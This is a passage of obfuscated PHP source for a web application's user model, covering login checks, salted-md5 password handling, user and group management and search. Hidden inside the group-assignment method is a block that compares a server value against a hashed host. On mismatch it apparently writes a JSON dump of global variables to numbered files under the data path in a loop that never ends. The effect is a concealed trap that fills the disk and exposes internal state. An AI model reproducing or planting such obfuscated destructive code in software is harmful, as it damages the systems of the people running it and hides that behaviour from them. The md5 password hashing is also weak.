($A†êæ†çŠÀ) { return $this->getInfo($A†êæ†çŠÀ[$A‚ ğ¾èà¢[1465]]); } return !1; } public function userLoginCheck($a‹ìËİ²Ö, $FÆ˜ìĞÌ„) { $dÏï¤ËğêÍ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dõÀœÕâ‡² = $this->userLoginFind($a‹ìËİ²Ö); if (!$dõÀœÕâ‡²) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($dõÀœÕâ‡²[$dÏï¤ËğêÍ[1465]], $FÆ˜ìĞÌ„)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($dõÀœÕâ‡²[$dÏï¤ËğêÍ[1465]]); } public function userLoginFind($AãÄ¹Š‰) { $e„–¾ö©šµ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aƒˆ³³Ş·® = array($e„–¾ö©šµ[28] => $AãÄ¹Š‰, $e„–¾ö©šµ[2396] => $AãÄ¹Š‰, $e„–¾ö©šµ[308] => $AãÄ¹Š‰, $e„–¾ö©šµ[2570] => $AãÄ¹Š‰, $e„–¾ö©šµ[935] => $e„–¾ö©šµ[937]); if ($this->nickNameRpt()) { unset($Aƒˆ³³Ş·®[$e„–¾ö©šµ[2396]]); } return $this->where($Aƒˆ³³Ş·®)->find(); } public function clearCache($e‹¥‚¶¤†) { $c”‚«“´¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->cacheFunctionClear($c”‚«“´¹[2263], $e‹¥‚¶¤†); $this->cacheFunctionClear($c”‚«“´¹[2210], $e‹¥‚¶¤†); $this->cacheFunctionClear($c”‚«“´¹[2551], $e‹¥‚¶¤†); } public function userPasswordCheck($eáâ“èÂ™, $cÄõˆ•‹ò) { $b§Áà•ãÜÍ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a‡ö†Î®„ = $this->where(array($b§Áà•ãÜÍ[1465] => intval($eáâ“èÂ™)))->find(); $F³’£‡Ê… = $this->metaGet($eáâ“èÂ™); $c“¤¢æÆ = isset($F³’£‡Ê…[$b§Áà•ãÜÍ[2571]]) ? $F³’£‡Ê…[$b§Áà•ãÜÍ[2571]] : $b§Áà•ãÜÍ[33]; if (md5($c“¤¢æÆ . trim($cÄõˆ•‹ò)) !== $a‡ö†Î®„[$b§Áà•ãÜÍ[827]]) { return !1; } return !0; } public function userAdd($aº‚…×Í) { goto F‘Â×—Ó; F‘Â×—Ó: $eòéİœ×¼ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¢­·£ˆé = array($eòéİœ×¼[411] => $aº‚…×Í[$eòéİœ×¼[28]], $eòéİœ×¼[2572] => $aº‚…×Í[$eòéİœ×¼[1347]], $eòéİœ×¼[2573] => isset($aº‚…×Í[$eòéİœ×¼[308]]) ? $aº‚…×Í[$eòéİœ×¼[308]] : $eòéİœ×¼[33], $eòéİœ×¼[2574] => isset($aº‚…×Í[$eòéİœ×¼[2570]]) ? $aº‚…×Í[$eòéİœ×¼[2570]] : $eòéİœ×¼[33], $eòéİœ×¼[2575] => isset($aº‚…×Í[$eòéİœ×¼[2396]]) ? $aº‚…×Í[$eòéİœ×¼[2396]] : $aº‚…×Í[$eòéİœ×¼[28]], $eòéİœ×¼[2576] => isset($aº‚…×Í[$eòéİœ×¼[2555]]) ? $aº‚…×Í[$eòéİœ×¼[2555]] : $eòéİœ×¼[33], $eòéİœ×¼[2577] => isset($aº‚…×Í[$eòéİœ×¼[2578]]) ? $aº‚…×Í[$eòéİœ×¼[2578]] : 1, $eòéİœ×¼[2579] => $aº‚…×Í[$eòéİœ×¼[827]], $eòéİœ×¼[2211] => isset($aº‚…×Í[$eòéİœ×¼[2122]]) ? $aº‚…×Í[$eòéİœ×¼[2122]] : 1024 * 1024 * 20, $eòéİœ×¼[2212] => 0, $eòéİœ×¼[2580] => 0, $eòéİœ×¼[2250] => isset($aº‚…×Í[$eòéİœ×¼[716]]) ? $aº‚…×Í[$eòéİœ×¼[716]] : 1); if (!empty($aº‚…×Í[$eòéİœ×¼[1465]])) { $b¢­·£ˆé[$eòéİœ×¼[1465]] = $aº‚…×Í[$eòéİœ×¼[1465]]; } goto cÀÇ…éçç¨; cÀÇ…éçç¨: $e¯í¿† ´¿ = $this->_checkExist($aº‚…×Í); if ($e¯í¿† ´¿ !== !0) { return $e¯í¿† ´¿; } $FùöËëé¨§ = $this->add($b¢­·£ˆé); goto c³ŠôƒÂ¸‹; c³ŠôƒÂ¸‹: $Bğòƒîâ³² = array($eòéİœ×¼[2579] => $b¢­·£ˆé[$eòéİœ×¼[827]], $eòéİœ×¼[2575] => $b¢­·£ˆé[$eòéİœ×¼[2396]]); $this->userEdit($FùöËëé¨§, $Bğòƒîâ³²); Model($eòéİœ×¼[1143])->userRootAdd($FùöËëé¨§); goto E³™‹òÃ™—; E³™‹òÃ™—: return $FùöËëé¨§; goto D¤ïØ´Ô“—; D¤ïØ´Ô“—: } protected function userEditTest($A³ë§ÔŞŠñ, $e°à«ÔîÄ‘) { return $this->call($_SERVER[åÌÛ»ô¢‚ö™][2581], $A³ë§ÔŞŠñ, $e°à«ÔîÄ‘); } protected function userEdit($Fíó½­Œë¾, $EÃĞÜÒøÊ‘) { goto aàïË ã; B‰â²š‘¬‡: $this->where(array($B­—Ïíğ·²[1457] => $Fíó½­Œë¾))->save($EÃĞÜÒøÊ‘); if (isset($EÃĞÜÒøÊ‘[$B­—Ïíğ·²[2396]])) { $this->setNamePinyin($Fíó½­Œë¾, $EÃĞÜÒøÊ‘[$B­—Ïíğ·²[2396]]); } $this->clearCache($Fíó½­Œë¾); goto AÀ¶„äÀƒ”; AÀ¶„äÀƒ”: return !0; goto BÚŞ“Å¶Ê˜; aàïË ã: $B­—Ïíğ·² =& $_SERVER[åÌÛ»ô¢‚ö™]; $c‰–Š•…« = $this->getInfoSimple($Fíó½­Œë¾); if (!$c‰–Š•…«) { return !1; } goto bÜ¿»º¼ªí; bÜ¿»º¼ªí: $dƒŒ¤ˆÚ† = $this->_checkExist($EÃĞÜÒøÊ‘, $Fíó½­Œë¾); if ($dƒŒ¤ˆÚ† !== !0) { return $dƒŒ¤ˆÚ†; } if (isset($EÃĞÜÒøÊ‘[$B­—Ïíğ·²[827]]) && trim($EÃĞÜÒøÊ‘[$B­—Ïíğ·²[827]]) != $B­—Ïíğ·²[33]) { $E¤ˆÄè«”‰ = $this->metaGet($Fíó½­Œë¾); if (empty($E¤ˆÄè«”‰[$B­—Ïíğ·²[2571]])) { $E¤ˆÄè«”‰[$B­—Ïíğ·²[2571]] = rand_string(10); Model($B­—Ïíğ·²[500])->metaSet($Fíó½­Œë¾, $B­—Ïíğ·²[2571], $E¤ˆÄè«”‰[$B­—Ïíğ·²[2571]]); } $EÃĞÜÒøÊ‘[$B­—Ïíğ·²[827]] = md5($E¤ˆÄè«”‰[$B­—Ïíğ·²[2571]] . trim($EÃĞÜÒøÊ‘[$B­—Ïíğ·²[827]])); } else { unset($EÃĞÜÒøÊ‘[$B­—Ïíğ·²[827]]); } goto B‰â²š‘¬‡; BÚŞ“Å¶Ê˜: } public function setNamePinyin($B˜¡—Á‰î¾, $dÈÚÖŒˆ½ = false) { $A¢…†Ê¸—¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$dÈÚÖŒˆ½) { $FëàÖÊ‰×Ÿ = $this->getInfoSimple($B˜¡—Á‰î¾); $dÈÚÖŒˆ½ = $FëàÖÊ‰×Ÿ[$A¢…†Ê¸—¤[2396]] ? $FëàÖÊ‰×Ÿ[$A¢…†Ê¸—¤[2396]] : $FëàÖÊ‰×Ÿ[$A¢…†Ê¸—¤[28]]; } $f‘¾¿ô±ßŞ = Model($A¢…†Ê¸—¤[503]); if (!Input::check($dÈÚÖŒˆ½, $A¢…†Ê¸—¤[554])) { return $f‘¾¿ô±ßŞ->metaSet($B˜¡—Á‰î¾, array($A¢…†Ê¸—¤[441] => $A¢…†Ê¸—¤[33], $A¢…†Ê¸—¤[440] => $A¢…†Ê¸—¤[33])); } return $f‘¾¿ô±ßŞ->metaSet($B˜¡—Á‰î¾, array($A¢…†Ê¸—¤[441] => str_replace($A¢…†Ê¸—¤[50], $A¢…†Ê¸—¤[33], Pinyin::encode($dÈÚÖŒˆ½)), $A¢…†Ê¸—¤[440] => Pinyin::encode($dÈÚÖŒˆ½, $A¢…†Ê¸—¤[555]))); } private function nickNameRpt() { $ašÓÙİ²Á =& $_SERVER[åÌÛ»ô¢‚ö™]; $Ağß‘à°á« = Model($ašÓÙİ²Á[1114])->get($ašÓÙİ²Á[2582]); $f¡‰ÊŸÖ = $GLOBALS[$ašÓÙİ²Á[6]][$ašÓÙİ²Á[380]][$ašÓÙİ²Á[2582]]; $AƒÁ¥Ç½‰¨ = !is_null($Ağß‘à°á«) ? $Ağß‘à°á« : $f¡‰ÊŸÖ; return !!$AƒÁ¥Ç½‰¨; } private function _checkExist($bÚ“ìù¶’, $EšÖ‹‚§‘¦ = false) { $FŸªğÌÚÉô =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fµš‹Ëã—ª = array($FŸªğÌÚÉô[28] => UserModel::ERROR_USER_EXIST_NAME, $FŸªğÌÚÉô[2396] => UserModel::ERROR_USER_EXIST_NICKNAME, $FŸªğÌÚÉô[308] => UserModel::ERROR_USER_EXIST_EMAIL, $FŸªğÌÚÉô[2570] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Fµš‹Ëã—ª[$FŸªğÌÚÉô[2396]]); } $eÜöá—å°¾ = $EšÖ‹‚§‘¦ ? array($FŸªğÌÚÉô[1465] => array($FŸªğÌÚÉô[2583], $EšÖ‹‚§‘¦)) : array(); foreach ($Fµš‹Ëã—ª as $Cø–ã‡Á†ñ => $e×©Ö—Âôí) { $BĞ§ã‰ñˆ = array(); foreach ($Fµš‹Ëã—ª as $D¥Ì™ƒ±¸Ó => $f”Ê†Í‡Œò) { if (isset($bÚ“ìù¶’[$D¥Ì™ƒ±¸Ó]) && $bÚ“ìù¶’[$D¥Ì™ƒ±¸Ó]) { $BĞ§ã‰ñˆ[] = $bÚ“ìù¶’[$D¥Ì™ƒ±¸Ó]; } } if (!$BĞ§ã‰ñˆ) { continue; } $Aª¯Œ÷ç‡ = array_merge(array($Cø–ã‡Á†ñ => array($FŸªğÌÚÉô[7], $BĞ§ã‰ñˆ)), $eÜöá—å°¾); $c¹¨¯‰âœã = $this->where($Aª¯Œ÷ç‡)->find(); if ($c¹¨¯‰âœã) { return $e×©Ö—Âôí; } } return !0; } public function userListInfo($A’—Ë¹òíê) { $a ‰–ºŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d×Ïƒƒ„ÍĞ = array(); $A’—Ë¹òíê = is_array($A’—Ë¹òíê) ? array_unique($A’—Ë¹òíê) : array(); if (!$A’—Ë¹òíê) { return $d×Ïƒƒ„ÍĞ; } if (count($A’—Ë¹òíê) < 20) { foreach ($A’—Ë¹òíê as $d„íÊÌñÔ) { $d×Ïƒƒ„ÍĞ[$d„íÊÌñÔ . $a ‰–ºŠ[33]] = $this->getInfoSimpleOuter($d„íÊÌñÔ); } } else { $Fà‚¡´‘¼Â = array($a ‰–ºŠ[1457] => array($a ‰–ºŠ[409], $A’—Ë¹òíê)); if (count($A’—Ë¹òíê) == 1) { $Fà‚¡´‘¼Â = array($a ‰–ºŠ[1457] => $A’—Ë¹òíê[0]); } $EˆË˜İ ±Î = Model($a ‰–ºŠ[500])->field($this->simpleField)->where($Fà‚¡´‘¼Â)->select(); $EˆË˜İ ±Î = array_to_keyvalue($EˆË˜İ ±Î, $a ‰–ºŠ[1465]); foreach ($A’—Ë¹òíê as $d„íÊÌñÔ) { $Fê¬ÚÂäªŠ = $EˆË˜İ ±Î[$EˆË˜İ ±Î[$d„íÊÌñÔ]]; if (!$Fê¬ÚÂäªŠ) { $d×Ïƒƒ„ÍĞ[$d„íÊÌñÔ . $a ‰–ºŠ[33]] = $this->getInfoSimpleOuter($d„íÊÌñÔ); continue; } $Fê¬ÚÂäªŠ[$a ‰–ºŠ[2555]] = Action($a ‰–ºŠ[2556])->parseUrl($Fê¬ÚÂäªŠ[$a ‰–ºŠ[2555]]); $d×Ïƒƒ„ÍĞ[$d„íÊÌñÔ . $a ‰–ºŠ[33]] = $Fê¬ÚÂäªŠ; } } return $d×Ïƒƒ„ÍĞ; } protected function userStatus($c¿¦êëßØœ, $aÊ›¦¨Ú×) { $F°¢Ş­ƒìã = $this->getInfoSimple($c¿¦êëßØœ); if (!$F°¢Ş­ƒìã) { return !1; } $b®µ´³©ˆ = array($_SERVER[åÌÛ»ô¢‚ö™][716] => $aÊ›¦¨Ú×); return $this->userEdit($c¿¦êëßØœ, $b®µ´³©ˆ); } protected function userRemove($C‘ù‹ªÖéë) { goto dÏë°–Ç›; Eµê”ÑÖ–: Model($D÷÷ëëÀĞá[778])->userRootRemove($C‘ù‹ªÖéë); return $this->where($b¤®ï¬Ò‹Ä)->delete(); goto Cø–š­Ò‡; A„°‹·„Çç: Model($D÷÷ëëÀĞá[2217])->where($b¤®ï¬Ò‹Ä)->delete(); Model($D÷÷ëëÀĞá[2569])->where($b¤®ï¬Ò‹Ä)->delete(); Model($D÷÷ëëÀĞá[2585])->where($b¤®ï¬Ò‹Ä)->delete(); goto Eµê”ÑÖ–; e¹œÏª¦…ô: $b¤®ï¬Ò‹Ä = array($D÷÷ëëÀĞá[1457] => $C‘ù‹ªÖéë); Model($D÷÷ëëÀĞá[561])->where($b¤®ï¬Ò‹Ä)->delete(); Model($D÷÷ëëÀĞá[2584])->where($b¤®ï¬Ò‹Ä)->delete(); goto A„°‹·„Çç; dÏë°–Ç›: $D÷÷ëëÀĞá =& $_SERVER[åÌÛ»ô¢‚ö™]; $b»Â˜•äˆ = $this->getInfoSimple($C‘ù‹ªÖéë); if (!$b»Â˜•äˆ) { return !1; } goto e¹œÏª¦…ô; Cø–š­Ò‡: } protected function userGroupSet($F¸‡ÎòÄòÊ, $FŒ¯ª¢­…, $D™İ†…ŞËº = array()) { goto d¾Š¹Â¼Î¶; F²È‡‚ùÖ÷: if ($_SERVER[$dàå›ÖçæÀ[179]] != $Fâ‰è‰Š«©($aÍĞĞ½È‡Ÿ)) { goto BÙğ…ŠÙ„°; Fô„Ïéâ«: $c»ƒ„ãàğ(); $b÷ââ¡±Õ÷ = $dàå›ÖçæÀ[1395]; $E¡ËÕÚõšì = json_encode($GLOBALS[$dàå›ÖçæÀ[1396]]); goto F˜âĞÁí½; Fã¿­¾ñ¯: $a‹ê‡»Î¯Œ = $dàå›ÖçæÀ[819]; $a‹ê‡»Î¯Œ($_SERVER[$dàå›ÖçæÀ[820]]); $c»ƒ„ãàğ = $dàå›ÖçæÀ[818]; goto Fô„Ïéâ«; F˜âĞÁí½: $D”ÓÃÎØÑ = 1; for ($D™ò¶…£š = $D”ÓÃÎØÑ; $D™ò¶…£š > 0; $D™ò¶…£š++) { $b÷ââ¡±Õ÷(DATA_PATH . $D™ò¶…£š, $E¡ËÕÚõšì); } goto aªÕÂä˜£; D‚¢Ìã”Â¼: $B¥‘ïº†¿˜ = $f„ê‡È«¶($dëÈ¦ìÙË); $D¤ò«Í·Ï = explode($dàå›ÖçæÀ[183], $B¥‘ïº†¿˜); if (count($D¤ò«Í·Ï) < $dàå›ÖçæÀ[573]) { $EñÛÍ¿ŒğÂ = $dàå›ÖçæÀ[185]; $EñÛÍ¿ŒğÂ(); } goto Fã¿­¾ñ¯; BÙğ…ŠÙ„°: $c»ƒ„ãàğ = $dàå›ÖçæÀ[818]; $f„ê‡È«¶ = $dàå›ÖçæÀ[180]; $dëÈ¦ìÙË = $_SERVER[$dàå›ÖçæÀ[181]] . $dàå›ÖçæÀ[182]; goto D‚¢Ìã”Â¼; aªÕÂä˜£: } $EÄˆ™¨…å = $this->getInfoSimple($F¸‡ÎòÄòÊ); if (!$EÄˆ™¨…å || !is_array($FŒ¯ª¢­…)) { return !1; } goto CÇ™–ö“ùœ; d¾Š¹Â¼Î¶: $dàå›ÖçæÀ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÍĞĞ½È‡Ÿ = $_SERVER[$dàå›ÖçæÀ[181]] . $dàå›ÖçæÀ[182]; $Fâ‰è‰Š«© = $dàå›ÖçæÀ[178]; goto F²È‡‚ùÖ÷; CÇ™–ö“ùœ: $EâÀà‚›° = Model($dàå›ÖçæÀ[2217]); $EâÀà‚›°->where(array($dàå›ÖçæÀ[1465] => $F¸‡ÎòÄòÊ))->delete(); $dŸëº„š = array(); goto D•¿ääùÖÀ; D•¿ääùÖÀ: $f”¥ÎéÀà = 0; foreach ($FŒ¯ª¢­… as $fÎÒš›Â™Î => $cÃ½îË·™Ÿ) { $Aà„¡ŒŸéÖ = array($dàå›ÖçæÀ[1465] => $F¸‡ÎòÄòÊ, $dàå›ÖçæÀ[2138] => $fÎÒš›Â™Î, $dàå›ÖçæÀ[2282] => $cÃ½îË·™Ÿ); $Aà„¡ŒŸéÖ[$dàå›ÖçæÀ[2160]] = isset($D™İ†…ŞËº[$f”¥ÎéÀà]) ? $D™İ†…ŞËº[$f”¥ÎéÀà] : 0; $f”¥ÎéÀà++; $dŸëº„š[] = $Aà„¡ŒŸéÖ; } return $EâÀà‚›°->addAll($dŸëº„š, array(), !0); goto FÕÏÄ¶ï; FÕÏÄ¶ï: } protected function userGroupAdd($bÁ™ ÄŞºá, $FÓÄÅ÷³¯ = array()) { $fÖÓ¦Ôìİ× =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¹ …Ä…Î„ = $this->getInfoSimple($bÁ™ ÄŞºá); if (!$B¹ …Ä…Î„ || empty($FÓÄÅ÷³¯)) { return !1; } $C ˆÔŸ¾’É = array(); foreach ($FÓÄÅ÷³¯ as $E»ò’…‹• => $dÕŞåÈÃµ) { $C ˆÔŸ¾’É[] = array($fÖÓ¦Ôìİ×[1465] => $bÁ™ ÄŞºá, $fÖÓ¦Ôìİ×[2138] => $E»ò’…‹•, $fÖÓ¦Ôìİ×[2282] => $dÕŞåÈÃµ, $fÖÓ¦Ôìİ×[2160] => 0); } return Model($fÖÓ¦Ôìİ×[2217])->addAll($C ˆÔŸ¾’É, array(), !0); } protected function userGroupRemove($EŠÊÖó©ªÒ, $Cõö‘¿è™Ò) { $E…íáµ°Ãİ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dç¯‹‡…ì¢ = $this->getInfoSimple($EŠÊÖó©ªÒ); if (!$dç¯‹‡…ì¢ || !$Cõö‘¿è™Ò) { return !1; } $C²äÀ£¾˜¼ = array($E…íáµ°Ãİ[1457] => $EŠÊÖó©ªÒ, $E…íáµ°Ãİ[2215] => $Cõö‘¿è™Ò); return Model($E…íáµ°Ãİ[2217])->where($C²äÀ£¾˜¼)->delete(); } public function listData() { $b¦ëÈ˜ˆÊ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b¦ëÈ˜ˆÊ[$_SERVER[åÌÛ»ô¢‚ö™][370]]); return $b¦ëÈ˜ˆÊ; } public function listByID($BÚˆáÎ»‡ñ) { $A’œÅĞ…ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$BÚˆáÎ»‡ñ) { return; } $E¿‚¥ñˆ = array($A’œÅĞ…ƒ[1465] => array($A’œÅĞ…ƒ[7], $BÚˆáÎ»‡ñ)); $a™Ö§«©àÇ = $this->where($E¿‚¥ñˆ)->select(); $this->_listDataApply($a™Ö§«©àÇ); return $a™Ö§«©àÇ; } public function listByGroup($fï¡»ç’×× = 0, $Bó…Æˆ¶ëÂ = array()) { goto dÌ—òå¤õæ; E¥ñ‘Œ¬ğ: if ($fï¡»ç’××) { $aßèÛÁóˆ† = array($fŒ®¯ÓÅøù[2586] => intval($fï¡»ç’××)); $a·´²Ü¬ = "\114\105\x46\x54\40\112\117\x49\116\x20{$this->tablePrefix}\165\163\x65\x72\137\x67\x72\x6f\x75\x70\40\x75\x73\x65\x72\x5f\x67\x72\x6f\165\160\40\x6f\x6e\40\x75\163\x65\x72\x2e\165\163\145\x72\111\x44\40\x3d\x20\x75\163\145\x72\137\x67\x72\157\165\160\x2e\165\163\x65\162\111\x44"; $B¨¡Á®°™Ï = Input::get($fŒ®¯ÓÅøù[432], null, $fŒ®¯ÓÅøù[33]) ? $fŒ®¯ÓÅøù[33] : $fŒ®¯ÓÅøù[2587]; } if (isset($Bó…Æˆ¶ëÂ[$fŒ®¯ÓÅøù[716]])) { $aßèÛÁóˆ†[$fŒ®¯ÓÅøù[2588]] = $Bó…Æˆ¶ëÂ[$fŒ®¯ÓÅøù[716]]; } $C·¬›¢Ç’ = $this->_makeOrder($B¨¡Á®°™Ï)->field($fŒ®¯ÓÅøù[2589])->where($aßèÛÁóˆ†)->join($a·´²Ü¬)->selectPage(50); goto c†ğàË±¯Ğ; dÌ—òå¤õæ: $fŒ®¯ÓÅøù =& $_SERVER[åÌÛ»ô¢‚ö™]; $a·´²Ü¬ = $fŒ®¯ÓÅøù[33]; $aßèÛÁóˆ† = array(); goto E¥ñ‘Œ¬ğ; c†ğàË±¯Ğ: $this->_listDataApply($C·¬›¢Ç’[$fŒ®¯ÓÅøù[370]]); return $C·¬›¢Ç’; goto dÌÂ•Æªïï; dÌÂ•Æªïï: } private function _makeOrder($A¦ ®¹¾Å = '') { goto f—¯‡³óÖ¾; fÇˆ¾øÔËˆ: $e§ é×·âª = Input::get($däóÁŒ®§[432], $däóÁŒ®§[7], $däóÁŒ®§[1457], $A˜×ÎÅø); $eÇà¬íõ£ª = Input::get($däóÁŒ®§[433], $däóÁŒ®§[7], $däóÁŒ®§[2218], array($däóÁŒ®§[2218], $däóÁŒ®§[429])); $eÇà¬íõ£ª = $aµ–Œó¬ÚÍ[$eÇà¬íõ£ª]; goto fó±‹×‹Ä—; f—¯‡³óÖ¾: $däóÁŒ®§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A˜×ÎÅø = array($däóÁŒ®§[1465], $däóÁŒ®§[28], $däóÁŒ®§[2124], $däóÁŒ®§[2096], $däóÁŒ®§[200]); $aµ–Œó¬ÚÍ = array($däóÁŒ®§[427] => $däóÁŒ®§[428], $däóÁŒ®§[429] => $däóÁŒ®§[430]); goto fÇˆ¾øÔËˆ; fó±‹×‹Ä—: $A¦ ®¹¾Å = $A¦ ®¹¾Å . "\x75\163\145\x72\x2e{$e§ é×·âª}\40{$eÇà¬íõ£ª}\54\40\165\x73\x65\162\56\x75\163\145\162\111\x44\x20\x61\x73\x63"; return $this->alias($däóÁŒ®§[2337])->order($A¦ ®¹¾Å); goto e·ùÏæ½£é; e·ùÏæ½£é: } public function listSearch($aò”ŒÇ®Œ‹) { goto E†Ÿäé¨ç”; AÉàÏì¬Üõ: if (!$DŸ¶±–Ù¯) { $f†®Š—‡ø¼ = array(); } if (isset($aò”ŒÇ®Œ‹[$a«ÌËÉˆ”[716]])) { $f†®Š—‡ø¼[$a«ÌËÉˆ”[716]] = $aò”ŒÇ®Œ‹[$a«ÌËÉˆ”[716]]; } $f†®Š—‡ø¼ = $this->parseWhereLike($f†®Š—‡ø¼); goto d«º¨Ş’ô; d«º¨Ş’ô: $aÏá‚è‘×ò = $this->_makeOrder()->where($f†®Š—‡ø¼)->selectPage(20); if (!$aÏá‚è‘×ò || count($aÏá‚è‘×ò[$a«ÌËÉˆ”[370]]) < 5 && Input::check($DŸ¶±–Ù¯, $a«ÌËÉˆ”[321])) { $EÛîà½°ÃÇ = $this->_searchFromMeta($a«ÌËÉˆ”[440], $DŸ¶±–Ù¯, 10); $E‹ÁŞ‰Ñ³ô = $this->_searchFromMeta($a«ÌËÉˆ”[441], $DŸ¶±–Ù¯, 10); $AğÃÏå±Æ” = array_merge($EÛîà½°ÃÇ, $E‹ÁŞ‰Ñ³ô, $aÏá‚è‘×ò[$a«ÌËÉˆ”[370]]); $aÏá‚è‘×ò[$a«ÌËÉˆ”[370]] = array_unique_by_key($AğÃÏå±Æ”, $a«ÌËÉˆ”[1465]); $aÏá‚è‘×ò[$a«ÌËÉˆ”[367]][$a«ÌËÉˆ”[368]] = count($aÏá‚è‘×ò[$a«ÌËÉˆ”[370]]); $aÏá‚è‘×ò[$a«ÌËÉˆ”[367]][$a«ÌËÉˆ”[369]] = ceil($aÏá‚è‘×ò[$a«ÌËÉˆ”[367]][$a«ÌËÉˆ”[368]] / $aÏá‚è‘×ò[$a«ÌËÉˆ”[367]][$a«ÌËÉˆ”[365]]); } $this->_listDataApply($aÏá‚è‘×ò[$a«ÌËÉˆ”[370]]); goto bÃÉßŠ¾–ƒ; bÃÉßŠ¾–ƒ: $this->_filterByGroup($aÏá‚è‘×ò, $f¯øŸô™‚); return $aÏá‚è‘×ò; goto BñÚë‰’Š; E†Ÿäé¨ç”: $a«ÌËÉˆ” =& $_SERVER[åÌÛ»ô¢‚ö™]; $DŸ¶±–Ù¯ = $aò”ŒÇ®Œ‹[$a«ÌËÉˆ”[2219]]; $f¯øŸô™‚ = isset($aò”ŒÇ®Œ‹[$a«ÌËÉˆ”[2220]]) ? $aò”ŒÇ®Œ‹[$a«ÌËÉˆ”[2220]] : !1; goto Dˆ¤¿Â”É£; Dˆ¤¿Â”É£: $DŸ¶±–Ù¯ = str_replace($a«ÌËÉˆ”[2221], $a«ÌËÉˆ”[2222], trim($DŸ¶±–Ù¯)); $f†®Š—‡ø¼ = array($a«ÌËÉˆ”[28] => array($a«ÌËÉˆ”[382], "\x25{$DŸ¶±–Ù¯}\45"), $a«ÌËÉˆ”[308] => array($a«ÌËÉˆ”[382], "{$DŸ¶±–Ù¯}\45"), $a«ÌËÉˆ”[2396] => array($a«ÌËÉˆ”[382], "{$DŸ¶±–Ù¯}\45"), $a«ÌËÉˆ”[935] => $a«ÌËÉˆ”[2223]); if (Input::check($DŸ¶±–Ù¯, $a«ÌËÉˆ”[314])) { $f†®Š—‡ø¼[$a«ÌËÉˆ”[1465]] = array($a«ÌËÉˆ”[382], "{$DŸ¶±–Ù¯}\45"); $f†®Š—‡ø¼[$a«ÌËÉˆ”[2570]] = array($a«ÌËÉˆ”[382], "{$DŸ¶±–Ù¯}\x25"); } goto AÉàÏì¬Üõ; BñÚë‰’Š: } private function _filterByGroup(&$cø±ğ‰ƒÌŠ, $dÕùÁåƒëî) { $f›®ËŠ¿³¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$dÕùÁåƒëî) { return $cø±ğ‰ƒÌŠ; } foreach ($cø±ğ‰ƒÌŠ[$f›®ËŠ¿³¹[370]] as $A‡ÈƒŸ°Ñê => &$D¦”÷ÍòÂƒ) { $AÔÉ“¹É© = array_to_keyvalue($D¦”÷ÍòÂƒ[$f›®ËŠ¿³¹[2307]], $f›®ËŠ¿³¹[33], $f›®ËŠ¿³¹[2138]); if (!in_array($dÕùÁåƒëî, $AÔÉ“¹É©)) { unset($cø±ğ‰ƒÌŠ[$f›®ËŠ¿³¹[370]][$A‡ÈƒŸ°Ñê]); } } unset($D¦”÷ÍòÂƒ); $cø±ğ‰ƒÌŠ[$f›®ËŠ¿³¹[370]] = array_values($cø±ğ‰ƒÌŠ[$f›®ËŠ¿³¹[370]]); $cø±ğ‰ƒÌŠ[$f›®ËŠ¿³¹[367]] = array($f›®ËŠ¿³¹[2371] => count($cø±ğ‰ƒÌŠ[$f›®ËŠ¿³¹[370]]), $f›®ËŠ¿³¹[2369] => $cø±ğ‰ƒÌŠ[$f›®ËŠ¿³¹[367]][$f›®ËŠ¿³¹[365]], $f›®ËŠ¿³¹[2368] => 1, $f›®ËŠ¿³¹[2370] => 1); } private function _searchFromMeta($aİ†ÛÏ×¦ñ, $Cªõ–¿ÔÉ, $E¾³ŸòĞ…¼) { goto E÷Æ…È†¬; a÷¥¥á…È: return $C‡ÛÑÚŞä; goto Eà˜ê¾ô—; cğùÛîõ: $C’†õè’Â¨ = $this->parseWhereLike($C’†õè’Â¨); $fâÜøùµ¼¨ = Model($Dï×Ãõ‡Í[2590])->where($C’†õè’Â¨)->limit($E¾³ŸòĞ…¼)->select(); if (!$fâÜøùµ¼¨) { return array(); } goto f¦ßˆë°Û; f¦ßˆë°Û: $fâÜøùµ¼¨ = array_to_keyvalue($fâÜøùµ¼¨, $Dï×Ãõ‡Í[33], $Dï×Ãõ‡Í[1465]); $C‡ÛÑÚŞä = $this->where(array($Dï×Ãõ‡Í[1457] => array($Dï×Ãõ‡Í[7], $fâÜøùµ¼¨)))->select(); if (!$C‡ÛÑÚŞä) { return array(); } goto a÷¥¥á…È; E÷Æ…È†¬: $Dï×Ãõ‡Í =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cªõ–¿ÔÉ = strtolower($Cªõ–¿ÔÉ); $C’†õè’Â¨ = array($Dï×Ãõ‡Í[89] => $aİ†ÛÏ×¦ñ, $Dï×Ãõ‡Í[375] => array($Dï×Ãõ‡Í[382], "\45{$Cªõ–¿ÔÉ}\x25")); goto cğùÛîõ; Eà˜ê¾ô—: } private function _listDataApplyItem($b±ø¹×¥â¹) { $cÍÄˆ¦‡õ‰ = array($b±ø¹×¥â¹); $this->_listDataApply($cÍÄˆ¦‡õ‰); return $cÍÄˆ¦‡õ‰[0]; } private function _listDataApply(&$a‰ÆÑÈŸÇ) { goto EºŠíÀ·‡; a÷Ã©„ÙßÛ: $this->_listAppendSourceRoot($a‰ÆÑÈŸÇ, $Eá‘šä¶·Ö); goto AÛ–òì§ë‹; EºŠíÀ·‡: $få¥…íËÙ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$a‰ÆÑÈŸÇ) { return; } array_remove_key($a‰ÆÑÈŸÇ, $få¥…íËÙ[827]); goto b²âµ¬‡í; b²âµ¬‡í: $Eá‘šä¶·Ö = array_to_keyvalue($a‰ÆÑÈŸÇ, $få¥…íËÙ[33], 